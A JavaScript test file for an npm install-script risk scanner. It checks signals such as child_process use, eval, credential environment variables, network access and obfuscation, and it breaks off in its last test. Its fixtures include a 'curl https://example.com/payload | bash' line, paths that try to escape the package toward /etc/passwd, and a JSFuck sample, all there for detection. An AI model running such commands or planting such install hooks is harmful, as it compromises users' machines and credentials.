const t = require('tap')
const { mkdtemp, writeFile, mkdir, rm } = require('node:fs/promises')
const { join } = require('node:path')
const { tmpdir } = require('node:os')

// Create a temp package directory with given files, run the scanner, then clean up.
const withPackage = async (t, files, fn) => {
  const dir = await mkdtemp(join(tmpdir(), 'npm-test-scanner-'))
  t.teardown(() => rm(dir, { recursive: true, force: true }))
  for (const [rel, content] of Object.entries(files)) {
    const abs = join(dir, rel)
    await mkdir(join(dir, rel, '..'), { recursive: true }).catch(() => {
      // mkdir with recursive:true throws only for non-directory errors; swallowing
      // EEXIST is intentional and safe here since writeFile will surface any real issue.
    })
    await writeFile(abs, content, 'utf8')
  }
  return fn(dir)
}

const scanner = (t, mocks = {}) =>
  t.mock('../../../lib/utils/script-risk-scanner.js', mocks)

// --- detectSignals unit tests -------------------------------------------

t.test('detectSignals: uses-child-process', (t) => {
  const { detectSignals } = scanner(t)
  t.ok(detectSignals("require('child_process')").includes('uses-child-process'))
  t.ok(detectSignals('require("child_process")').includes('uses-child-process'))
  t.ok(detectSignals("require('node:child_process')").includes('uses-child-process'),
    'node: prefix form is detected')
  t.ok(detectSignals('require("node:child_process")').includes('uses-child-process'),
    'node: prefix double-quote form is detected')
  t.notOk(detectSignals('// no child_process here').includes('uses-child-process'))
  t.end()
})

t.test('detectSignals: uses-child-process detects ESM imports', (t) => {
  const { detectSignals } = scanner(t)
  t.ok(detectSignals("import { exec } from 'child_process'").includes('uses-child-process'),
    'named ESM import')
  t.ok(detectSignals('import cp from "child_process"').includes('uses-child-process'),
    'default ESM import')
  t.ok(detectSignals("import * as cp from 'child_process'").includes('uses-child-process'),
    'namespace ESM import')
  t.ok(detectSignals("import { exec } from 'node:child_process'").includes('uses-child-process'),
    'node: prefix ESM import')
  t.notOk(detectSignals("import { readFile } from 'fs'").includes('uses-child-process'),
    'unrelated ESM import is not flagged')
  t.end()
})

t.test('detectSignals: uses-eval', (t) => {
  const { detectSignals } = scanner(t)
  t.ok(detectSignals('eval(code)').includes('uses-eval'))
  t.ok(detectSignals('new Function("return 1")').includes('uses-eval'))
  t.notOk(detectSignals('// evaluation comment').includes('uses-eval'))
  t.end()
})

t.test('detectSignals: reads-process-env', (t) => {
  const { detectSignals } = scanner(t)
  t.ok(detectSignals('process.env.HOME').includes('reads-process-env'))
  t.ok(detectSignals('const x = process.env').includes('reads-process-env'))
  t.notOk(detectSignals('// no env access').includes('reads-process-env'))
  t.end()
})

t.test('detectSignals: references-credential-env-var', (t) => {
  const { detectSignals } = scanner(t)
  t.ok(detectSignals('process.env.NPM_TOKEN').includes('references-credential-env-var'))
  t.ok(detectSignals('process.env.GITHUB_TOKEN').includes('references-credential-env-var'))
  t.ok(detectSignals('process.env.SECRET').includes('references-credential-env-var'))
  t.ok(detectSignals('process.env.password').includes('references-credential-env-var'))
  t.notOk(detectSignals('process.env.NODE_ENV').includes('references-credential-env-var'))
  t.end()
})

t.test('detectSignals: network-access', (t) => {
  const { detectSignals } = scanner(t)
  t.ok(detectSignals("require('https')").includes('network-access'))
  t.ok(detectSignals("require('node:https')").includes('network-access'),
    'node: prefix https is detected')
  t.ok(detectSignals("require('node:http')").includes('network-access'),
    'node: prefix http is detected')
  t.ok(detectSignals("require('axios')").includes('network-access'))
  t.ok(detectSignals('fetch(url)').includes('network-access'))
  t.ok(detectSignals('https.get(url)').includes('network-access'))
  t.notOk(detectSignals('// no network').includes('network-access'))
  t.end()
})

t.test('detectSignals: writes-file', (t) => {
  const { detectSignals } = scanner(t)
  t.ok(detectSignals('fs.writeFileSync(path, data)').includes('writes-file'))
  t.ok(detectSignals('fs.createWriteStream(path)').includes('writes-file'))
  t.ok(detectSignals('fs.promises.writeFile(path, data)').includes('writes-file'))
  t.notOk(detectSignals('fs.readFileSync(path)').includes('writes-file'))
  t.end()
})

t.test('detectSignals: external-url', (t) => {
  const { detectSignals } = scanner(t)
  t.ok(detectSignals('https://example.com/file').includes('external-url'))
  t.ok(detectSignals('http://example.com').includes('external-url'))
  t.notOk(detectSignals('// no url').includes('external-url'))
  t.end()
})

t.test('detectSignals: makes-executable', (t) => {
  const { detectSignals } = scanner(t)
  // chmod with an execute bit set (octal, string, or `+x`) is the discriminator
  // that a fetched file is meant to be RUN — corroborating a binary download.
  t.ok(detectSignals('fs.chmodSync(target, 0o755)').includes('makes-executable'), 'octal 0o755')
  t.ok(detectSignals('fs.chmod(p, 0o744, cb)').includes('makes-executable'), 'octal 0o744 (owner exec)')
  t.ok(detectSignals('chmodSync(bin, "755")').includes('makes-executable'), 'string mode "755"')
  t.ok(detectSignals('execSync(`chmod +x ${bin}`)').includes('makes-executable'), 'chmod +x')
  t.ok(detectSignals('chmod 755 ./bin').includes('makes-executable'), 'shell chmod 755')
  // Non-executable modes and unrelated writes must not trigger.
  t.notOk(detectSignals('chmod(file, 0o644)').includes('makes-executable'), 'octal 0o644 not executable')
  t.notOk(detectSignals('chmodSync(bin, "644")').includes('makes-executable'), 'string mode "644"')
  t.notOk(detectSignals('chmod 644 ./x').includes('makes-executable'), 'shell chmod 644')
  t.notOk(detectSignals('fs.writeFileSync(p, data)').includes('makes-executable'), 'plain write')
  t.end()
})

t.test('detectSignals: base64-decode-exec', (t) => {
  const { detectSignals } = scanner(t)
  t.ok(detectSignals("Buffer.from(x, 'base64')").includes('base64-decode-exec'))
  t.notOk(detectSignals("Buffer.from(x, 'utf8')").includes('base64-decode-exec'))
  t.end()
})

t.test('detectSignals: obfuscation-pattern', (t) => {
  const { detectSignals } = scanner(t)
  // 10+ sequential hex escapes
  const dense = '\\x68\\x65\\x6c\\x6c\\x6f\\x20\\x77\\x6f\\x72\\x6c\\x64'
  t.ok(detectSignals(dense).includes('obfuscation-pattern'))
  t.notOk(detectSignals('\\x41\\x42').includes('obfuscation-pattern'))
  t.end()
})

t.test('detectSignals: native-build', (t) => {
  const { detectSignals } = scanner(t)
  // Original patterns
  t.ok(detectSignals('node-gyp rebuild').includes('native-build'), 'node-gyp')
  t.ok(detectSignals('binding.gyp').includes('native-build'), 'binding.gyp')
  // Extended patterns
  t.ok(detectSignals('node-pre-gyp install --fallback-to-build').includes('native-build'), 'node-pre-gyp')
  t.ok(detectSignals('prebuild-install --runtime napi').includes('native-build'), 'prebuild-install')
  t.ok(detectSignals('prebuildify --napi').includes('native-build'), 'prebuildify')
  t.ok(detectSignals('cmake-js compile').includes('native-build'), 'cmake-js')
  t.ok(detectSignals('napi build --release --platform').includes('native-build'), 'napi build (napi-rs CLI)')
  t.ok(detectSignals('neon build --release').includes('native-build'), 'neon build (Rust/Neon)')
  // Negative: should not false-positive on unrelated commands
  t.notOk(detectSignals('node build.js').includes('native-build'), 'node build.js is not native')
  t.notOk(detectSignals('tsc --build').includes('native-build'), 'tsc --build is not native')
  t.end()
})

t.test('detectSignals: uses-vm', (t) => {
  const { detectSignals } = scanner(t)
  t.ok(detectSignals("require('vm')").includes('uses-vm'), "bare require('vm')")
  t.ok(detectSignals("require('node:vm')").includes('uses-vm'), "node: prefix require")
  t.ok(detectSignals("import vm from 'node:vm'").includes('uses-vm'), 'ESM node: prefix import')
  t.notOk(detectSignals('// no vm here').includes('uses-vm'))
  t.end()
})

// --- findLocalRefs unit tests -------------------------------------------

t.test('findLocalRefs: detects require with single and double quotes', (t) => {
  const { findLocalRefs } = scanner(t)
  const refs = findLocalRefs("const x = require('./lib/helper')")
  t.ok(refs.includes('./lib/helper'))
  t.end()
})

t.test('findLocalRefs: detects ES module import from', (t) => {
  const { findLocalRefs } = scanner(t)
  const refs = findLocalRefs("import foo from './utils'")
  t.ok(refs.includes('./utils'))
  t.end()
})

t.test('findLocalRefs: ignores external module requires', (t) => {
  const { findLocalRefs } = scanner(t)
  const refs = findLocalRefs("require('lodash'); require('fs')")
  t.equal(refs.length, 0)
  t.end()
})

t.test('findLocalRefs: ignores parent-escaping paths', (t) => {
  // '../' prefixed paths within a package are fine (still relative),
  // they just get checked by resolveLocalRef for package-boundary escape.
  const { findLocalRefs } = scanner(t)
  const refs = findLocalRefs("require('../sibling')")
  t.ok(refs.includes('../sibling'))
  t.end()
})

t.test('findLocalRefs: detects dynamic import() with literal local path', (t) => {
  const { findLocalRefs } = scanner(t)
  t.ok(findLocalRefs("import('./helper.js')").includes('./helper.js'),
    'single-quote dynamic import')
  t.ok(findLocalRefs('import("./helper.js")').includes('./helper.js'),
    'double-quote dynamic import')
  t.ok(findLocalRefs("then(() => import('./lazy.mjs'))").includes('./lazy.mjs'),
    'dynamic import inside a callback')
  t.notOk(findLocalRefs("import('lodash')").length > 0,
    'non-local dynamic import is ignored')
  t.end()
})

t.test('findLocalRefs: paths with spaces are matched inside quoted strings', (t) => {
  const { findLocalRefs } = scanner(t)
  // require() — single quotes around a path that has an internal space
  t.ok(findLocalRefs("require('./my lib/helper.js')").includes('./my lib/helper.js'),
    'require: single-quoted path with space')
  t.ok(findLocalRefs('require("./my lib/helper.js")').includes('./my lib/helper.js'),
    'require: double-quoted path with space')
  // ESM static import
  t.ok(findLocalRefs("import x from './my utils.js'").includes('./my utils.js'),
    'import from: path with space')
  // Dynamic import
  t.ok(findLocalRefs("import('./my module.js')").includes('./my module.js'),
    'dynamic import: path with space')
  // The enclosing quote still acts as the path terminator — a path that
  // spans two quoted strings must NOT be merged by the regex.
  t.notOk(findLocalRefs("require('./a') + require('./b')").includes('./a') === false,
    'two separate requires are not merged')
  t.end()
})

t.test('findLocalRefs: opposite quote type inside path is captured', (t) => {
  const { findLocalRefs } = scanner(t)
  // Double-quoted path containing a single quote
  t.ok(findLocalRefs("require(\"./o'clock.js\")").includes("./o'clock.js"),
    "require: double-quoted path containing single quote")
  // Single-quoted path containing a double quote
  t.ok(findLocalRefs("require('./say \"hi\".js')").includes('./say "hi".js'),
    'require: single-quoted path containing double quote')
  // ESM static import — double-quoted path with single quote
  t.ok(findLocalRefs("import x from \"./o'clock.js\"").includes("./o'clock.js"),
    "import from: double-quoted path with single quote")
  // Dynamic import — single-quoted path with double quote
  t.ok(findLocalRefs("import('./say \"hi\".js')").includes('./say "hi".js'),
    'dynamic import: single-quoted path with double quote')
  // The terminating quote still ends the path — opposite quote does NOT terminate
  t.notOk(findLocalRefs("require('./a') + require('./b')").includes("./a') + require('./b"),
    'closing quote terminates path correctly even with opposite quote present')
  t.end()
})

t.test('findLocalRefs: shell source quoted path with opposite quote type is captured', (t) => {
  const { findLocalRefs } = scanner(t)
  // Unquoted path — existing behaviour preserved
  t.ok(findLocalRefs('. ./setup.sh').includes('./setup.sh'),
    'unquoted source path captured')
  // Double-quoted path containing a single quote
  t.ok(findLocalRefs(". \"./o'clock.sh\"").includes("./o'clock.sh"),
    "source: double-quoted path with single quote captured")
  // Single-quoted path containing a double quote
  t.ok(findLocalRefs(". './say \"hi\".sh'").includes('./say "hi".sh'),
    'source: single-quoted path with double quote captured')
  t.end()
})

// --- Full scanPackageScripts integration tests ---------------------------

t.test('returns empty array for empty scripts', async (t) => {
  const scan = scanner(t)
  const result = await scan('/nonexistent/dir', {})
  t.strictSame(result, [])
})

t.test('returns empty array for null inputs', async (t) => {
  const scan = scanner(t)
  t.strictSame(await scan(null, null), [])
  t.strictSame(await scan('/dir', null), [])
})

t.test('scans a node invocation and detects signals', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'install.js': [
      "const cp = require('child_process')",
      'process.env.NPM_TOKEN',
      "require('https')",
    ].join('\n'),
  }, async (dir) => {
    const result = await scan(dir, { install: 'node install.js' })
    t.equal(result.length, 1)
    const file = result[0]
    t.equal(file.path, 'install.js')
    t.match(file.reason, /install/)
    t.ok(file.sha256, 'sha256 is set')
    t.ok(file.signals.includes('uses-child-process'))
    t.ok(file.signals.includes('reads-process-env'))
    t.ok(file.signals.includes('network-access'))
    t.ok(file.signals.includes('references-credential-env-var'))
  })
})

t.test('follows local require() chains up to max depth', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'install.js': "const helper = require('./lib/helper')",
    'lib/helper.js': "const util = require('./util')",
    'lib/util.js': "require('https')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'node install.js' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('install.js'))
    t.ok(paths.includes('lib/helper.js'))
    t.ok(paths.includes('lib/util.js'))
  })
})

t.test('flags requires-local-file when local imports are found', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'setup.js': "const x = require('./helper')",
    'helper.js': 'module.exports = 42',
  }, async (dir) => {
    const result = await scan(dir, { postinstall: 'node setup.js' })
    const setup = result.find((f) => f.path === 'setup.js')
    t.ok(setup)
    t.ok(setup.signals.includes('requires-local-file'))
    t.ok(setup.references.includes('helper.js'))
  })
})

t.test('gracefully marks unreadable file as file-unreadable', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {}, async (dir) => {
    // Reference a file that does not exist.
    const result = await scan(dir, { install: 'node missing.js' })
    t.equal(result.length, 1)
    t.ok(result[0].signals.includes('file-unreadable'))
    t.equal(result[0].sha256, null)
  })
})

t.test('detects signals in files larger than one chunk (no large-file bypass)', async (t) => {
  // Write a file whose signal-bearing content sits past the first 64 KB chunk
  // boundary.  The scanner must still detect the signal via chunked streaming.
  const scan = scanner(t)
  const CHUNK = 64 * 1024
  // Pad content to push the signal clearly into the second chunk.
  const padding = 'x'.repeat(CHUNK + 100)
  const content = padding + "\nrequire('child_process')\n"
  await withPackage(t, { 'big.js': content }, async (dir) => {
    const result = await scan(dir, { install: 'node big.js' })
    t.equal(result.length, 1)
    t.equal(result[0].path, 'big.js')
    t.ok(result[0].signals.includes('uses-child-process'),
      'signal past first chunk boundary is detected')
    // No file-too-large: file is under the 50 MB hard cap.
    t.notOk(result[0].signals.includes('file-too-large'),
      'no false file-too-large for a normally-sized file')
    t.ok(result[0].sha256, 'SHA-256 is populated for fully-scanned file')
  })
})

t.test('file-too-large is emitted alongside signals for oversized files', async (t) => {
  // Simulate a file that exceeds MAX_SCAN_BYTES by mocking fs.open to return a
  // handle that streams synthetic chunks until the scanner's 50 MB cap fires.
  // fs.lstat is also mocked so the scanner treats the fake path as a real file.
  const crypto = require('node:crypto')
  const SCANNER_CHUNK_SIZE = 64 * 1024  // must match the scanner's CHUNK_SIZE
  const FAKE_CHUNK_SIZE = 1024 * 1024  // 1 MB per fake read
  const MAX_SCAN_BYTES = 50 * 1024 * 1024

  // Signal text embedded in the very first fake chunk.
  const firstChunk = "eval('x')" + 'y'.repeat(FAKE_CHUNK_SIZE - 9)
  const laterChunk = Buffer.alloc(FAKE_CHUNK_SIZE, 'z')

  let callCount = 0
  const fakeFh = {
    read: async (buf, offset, length, position) => {
      if (position >= MAX_SCAN_BYTES) {
        return { bytesRead: 0 }
      }
      callCount++
      const src = Buffer.from(callCount === 1 ? firstChunk : laterChunk)
      const bytesRead = Math.min(length, src.length)
      src.copy(buf, 0, 0, bytesRead)
      return { bytesRead }
    },
    close: async () => {},
  }

  // Fake stat object that passes the isFile() guard in the scanner.
  const fakeStat = { isFile: () => true }

  const mockFs = {
    ...require('node:fs/promises'),
    lstat: async () => fakeStat,
    open: async () => fakeFh,
  }

  const scan = t.mock('../../../lib/utils/script-risk-scanner.js', {
    'node:fs/promises': mockFs,
  })

  // Compute the expected hash independently: the scanner reads in SCANNER_CHUNK_SIZE
  // chunks from the fake file, so replay the same reads to get the expected digest.
  const expectedHash = crypto.createHash('sha256')
  let pos = 0
  while (pos < MAX_SCAN_BYTES) {
    const src = pos === 0 ? Buffer.from(firstChunk) : laterChunk
    const start = pos % FAKE_CHUNK_SIZE
    const bytesRead = Math.min(SCANNER_CHUNK_SIZE, MAX_SCAN_BYTES - pos, src.length - start)
    expectedHash.update(src.subarray(start, start + bytesRead))
    pos += bytesRead
  }
  const expectedSha256 = expectedHash.digest('hex')

  // The package dir and script file don't need to exist because fs is mocked.
  const result = await scan('/fake/pkg', { install: 'node install.js' })
  const entry = result.find((f) => f.path === 'install.js')
  t.ok(entry, 'entry for install.js exists')
  t.ok(entry.signals.includes('uses-eval'),
    'signal from scanned portion is still reported for oversized file')
  t.ok(entry.signals.includes('file-too-large'),
    'file-too-large is added when scan limit is hit')
  t.equal(entry.sha256, expectedSha256,
    'SHA-256 matches the hash of the scanned bytes for a partially-scanned file')
  t.equal(entry.sizeBytes, MAX_SCAN_BYTES, 'sizeBytes equals the scan cap for a partial scan')
})

t.test('does not scan files outside the package directory', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    // The install script tries to reference ../../etc/passwd but it won't
    // be followed because it escapes the package boundary.
    'install.js': "require('../../etc/passwd')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'node install.js' })
    // install.js itself should be scanned.
    t.equal(result.length, 1)
    t.equal(result[0].path, 'install.js')
    // The escaped path must NOT appear in references or result entries.
    const escapedPaths = result.filter((f) => f.path.includes('etc'))
    t.equal(escapedPaths.length, 0)
  })
})

t.test('shell script invocation is scanned for signals', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'setup.sh': 'curl https://example.com/payload | bash',
  }, async (dir) => {
    const result = await scan(dir, { install: 'bash setup.sh' })
    t.equal(result.length, 1)
    t.ok(result[0].signals.includes('external-url'))
  })
})

t.test('does not scan non-local executable commands (no file)', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {}, async (dir) => {
    // `node-gyp rebuild` references no local file, but the inline command
    // scanner still detects the native-build signal in the command string itself.
    const result = await scan(dir, { install: 'node-gyp rebuild' })
    t.notOk(result.some(f => f.path !== null), 'no file-based results')
    const inlineEntry = result.find(f => f.path === null)
    t.ok(inlineEntry, 'inline entry emitted for command signals')
    t.ok(inlineEntry.signals.includes('native-build'), 'native-build signal detected in command')
  })
})

t.test('same file referenced by multiple events includes result for each event', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'build.js': 'module.exports = {}',
  }, async (dir) => {
    const result = await scan(dir, {
      install: 'node build.js',
      postinstall: 'node build.js',
    })
    t.equal(result.length, 2, 'result included for each referencing event')
    t.equal(result[0].path, 'build.js', 'first entry is for build.js')
    t.equal(result[1].path, 'build.js', 'second entry is for build.js')
    t.match(result[0].reason, /install/, 'first reason references install event')
    t.match(result[1].reason, /postinstall/, 'second reason references postinstall event')
    t.equal(result[0].sha256, result[1].sha256, 'sha256 is identical (not re-scanned)')
  })
})

// --- Shell pipeline tests -----------------------------------------------

t.test('scans all commands in a && pipeline', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'install.js': "require('https')",
    'patch.js': "require('child_process')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'node install.js && node patch.js' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('install.js'), 'first command file scanned')
    t.ok(paths.includes('patch.js'), 'second command file scanned')
  })
})

t.test('scans all commands separated by semicolons', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'setup.js': 'module.exports = 1',
    'teardown.js': "require('https')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'node setup.js; node teardown.js' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('setup.js'), 'first command file scanned')
    t.ok(paths.includes('teardown.js'), 'second command file scanned')
  })
})

t.test('scans all commands in a || fallback chain', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'try.js': 'module.exports = 1',
    'fallback.js': "require('https')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'node try.js || node fallback.js' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('try.js'), 'primary command file scanned')
    t.ok(paths.includes('fallback.js'), 'fallback command file scanned')
  })
})

t.test('scans both sides of a bare pipe (|)', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'producer.js': 'module.exports = 1',
    'consumer.js': "require('child_process')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'node producer.js | node consumer.js' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('producer.js'), 'producer (left of |) is scanned')
    t.ok(paths.includes('consumer.js'), 'consumer (right of |) is scanned')
  })
})

t.test('scans both sides of a & background operator', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'background.js': "require('child_process')",
    'main.js': 'module.exports = 1',
  }, async (dir) => {
    const result = await scan(dir, { install: 'node background.js & node main.js' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('background.js'), 'background command file scanned')
    t.ok(paths.includes('main.js'), 'foreground command file scanned')
  })
})

t.test('deduplicates files appearing in multiple pipeline segments', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'build.js': 'module.exports = {}',
  }, async (dir) => {
    const result = await scan(dir, { install: 'node build.js && node build.js' })
    t.equal(result.length, 1, 'same file only scanned once across pipeline segments')
  })
})

// --- --require / -r / --import preload flag tests -----------------------

t.test('scans --require preload file and main script', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'preload.js': "require('child_process')",
    'main.js': 'module.exports = 1',
  }, async (dir) => {
    const result = await scan(dir, { install: 'node --require ./preload.js ./main.js' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('preload.js'), '--require preload file is scanned')
    t.ok(paths.includes('main.js'), 'main script is scanned')
  })
})

t.test('scans -r preload file and main script', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'preload.js': "require('child_process')",
    'main.js': 'module.exports = 1',
  }, async (dir) => {
    const result = await scan(dir, { install: 'node -r ./preload.js ./main.js' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('preload.js'), '-r preload file is scanned')
    t.ok(paths.includes('main.js'), 'main script is scanned')
  })
})

t.test('scans --import ESM preload file and main script', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'preload.mjs': "import { exec } from 'child_process'",
    'main.mjs': 'export default 1',
  }, async (dir) => {
    const result = await scan(dir, { install: 'node --import ./preload.mjs ./main.mjs' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('preload.mjs'), '--import preload file is scanned')
    t.ok(paths.includes('main.mjs'), 'main script is scanned')
  })
})

t.test('ignores non-local --require specifier (npm package)', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'main.js': 'module.exports = 1',
  }, async (dir) => {
    const result = await scan(dir, { install: 'node --require dotenv/config ./main.js' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('main.js'), 'main script is still scanned')
    t.notOk(paths.some((p) => p.includes('dotenv')), 'non-local specifier is not scanned')
  })
})

t.test('scans multiple -r preloads and main script', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'pre1.js': "require('child_process')",
    'pre2.js': "require('https')",
    'main.js': 'module.exports = 1',
  }, async (dir) => {
    const result = await scan(dir, { install: 'node -r ./pre1.js -r ./pre2.js ./main.js' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('pre1.js'), 'first -r preload is scanned')
    t.ok(paths.includes('pre2.js'), 'second -r preload is scanned')
    t.ok(paths.includes('main.js'), 'main script is scanned')
  })
})

// --- --loader / --experimental-loader tests ----------------------------

t.test('scans --loader file and main script', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'loader.mjs': "import { exec } from 'child_process'",
    'main.mjs': 'export default 1',
  }, async (dir) => {
    const result = await scan(dir, { install: 'node --loader ./loader.mjs ./main.mjs' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('loader.mjs'), '--loader file is scanned')
    t.ok(paths.includes('main.mjs'), 'main script is scanned')
    const loaderEntry = result.find((f) => f.path === 'loader.mjs')
    t.ok(loaderEntry.signals.includes('uses-child-process'), 'signals detected in loader file')
  })
})

t.test('scans --experimental-loader file and main script', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'loader.mjs': "import { exec } from 'node:child_process'",
    'main.js': 'module.exports = 1',
  }, async (dir) => {
    const result = await scan(dir, { install: 'node --experimental-loader ./loader.mjs ./main.js' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('loader.mjs'), '--experimental-loader file is scanned')
    t.ok(paths.includes('main.js'), 'main script is scanned')
  })
})

// --- Equals-form flag tests (--require=, --import=, --loader=) ----------

t.test('scans --require=./file.js equals form', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'preload.js': "require('child_process')",
    'main.js': 'module.exports = 1',
  }, async (dir) => {
    const result = await scan(dir, { install: 'node --require=./preload.js ./main.js' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('preload.js'), '--require= preload is scanned')
    t.ok(paths.includes('main.js'), 'main script is scanned')
  })
})

t.test('scans --import=./file.mjs equals form', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'preload.mjs': "import { exec } from 'node:child_process'",
    'main.mjs': 'export default 1',
  }, async (dir) => {
    const result = await scan(dir, { install: 'node --import=./preload.mjs ./main.mjs' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('preload.mjs'), '--import= preload is scanned')
    t.ok(paths.includes('main.mjs'), 'main script is scanned')
  })
})

t.test('scans --loader=./file.mjs equals form', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'loader.mjs': "import { exec } from 'child_process'",
    'main.js': 'module.exports = 1',
  }, async (dir) => {
    const result = await scan(dir, { install: 'node --loader=./loader.mjs ./main.js' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('loader.mjs'), '--loader= file is scanned')
    t.ok(paths.includes('main.js'), 'main script is scanned')
  })
})

// --- env interpreter tests ----------------------------------------------

t.test('scans script when invoked via env node', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'install.js': "require('child_process')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'env node ./install.js' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('install.js'), 'env node ./script.js — script is scanned')
    const entry = result.find((f) => f.path === 'install.js')
    t.ok(entry.signals.includes('uses-child-process'), 'signals detected in env-wrapped invocation')
  })
})

t.test('scans script when invoked via env with KEY=VALUE assignments', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'install.js': "require('https')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'env NODE_ENV=production node ./install.js' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('install.js'), 'env KEY=VALUE node ./script.js — script is scanned')
  })
})

t.test('scans dynamic import() local reference', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'setup.js': "const mod = import('./helper.js')",
    'helper.js': "require('https')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'node setup.js' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('setup.js'), 'entry file is scanned')
    t.ok(paths.includes('helper.js'), 'file referenced via dynamic import() is scanned')
    const helper = result.find((f) => f.path === 'helper.js')
    t.ok(helper.signals.includes('network-access'), 'signals in dynamic-import target are detected')
  })
})

// --- resolveLocalRef package.json#main tests ----------------------------

t.test('resolves directory reference via package.json#main', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'install.js': "const lib = require('./lib')",
    'lib/package.json': JSON.stringify({ main: 'build/index.js' }),
    'lib/build/index.js': "require('https')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'node install.js' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('lib/build/index.js'), 'followed package.json#main into lib/build/index.js')
    const entry = result.find((f) => f.path === 'lib/build/index.js')
    t.ok(entry.signals.includes('network-access'), 'signals from main-resolved file are detected')
  })
})

t.test('falls back to index.js when package.json#main is absent', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'install.js': "const lib = require('./lib')",
    'lib/index.js': "require('https')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'node install.js' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('lib/index.js'), 'resolved to lib/index.js without package.json')
  })
})

t.test('ignores package.json#main that escapes the package boundary', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'install.js': "const lib = require('./lib')",
    'lib/package.json': JSON.stringify({ main: '../../../../etc/passwd' }),
    'lib/index.js': 'module.exports = {}',
  }, async (dir) => {
    const result = await scan(dir, { install: 'node install.js' })
    const paths = result.map((f) => f.path)
    // Must not have followed the escaping main; may fall back to lib/index.js
    t.notOk(paths.some((p) => p.includes('etc')), 'escaping main path not followed')
  })
})

// --- JSFuck detection ---------------------------------------------------

t.test('detectSignals: jsfuck-obfuscation detects 30+ char run of []()!+', (t) => {
  const { detectSignals } = scanner(t)
  // A minimal JSFuck expression (30 chars of only the 6 JSFuck characters)
  const jsfuck = '[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]'
  t.ok(detectSignals(jsfuck).includes('jsfuck-obfuscation'), 'long JSFuck expression detected')
  t.end()
})

t.test('detectSignals: jsfuck-obfuscation does not flag short sequences', (t) => {
  const { detectSignals } = scanner(t)
  // Legitimate JS: short bracket/paren sequences should not be flagged
  t.notOk(detectSignals('if (!!foo) { bar() }').includes('jsfuck-obfuscation'),
    'ordinary JS brackets are not flagged')
  t.notOk(detectSignals('[]()!+').includes('jsfuck-obfuscation'),
    '6 chars is below the 30-char threshold')
  t.end()
})

t.test('scanPackageScripts: jsfuck in a referenced JS file is detected', async (t) => {
  const scan = scanner(t)
  // Build a JSFuck string that is >= 30 chars from the set []()!+
  const jsfuckPayload = '[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]'
  await withPackage(t, {
    'install.js': jsfuckPayload,
  }, async (dir) => {
    const result = await scan(dir, { install: 'node install.js' })
    const entry = result.find((f) => f.path === 'install.js')
    t.ok(entry, 'install.js appears in scan results')
    t.ok(entry.signals.includes('jsfuck-obfuscation'),
      'jsfuck-obfuscation signal present in referenced file')
  })
})

t.test('scanPackageScripts: jsfuck embedded inline via node -e is detected', async (t) => {
  // `node -e` causes parseSingleCommand to return no file refs.
  // The inline command scanner must still surface the signal.
  const scan = scanner(t)
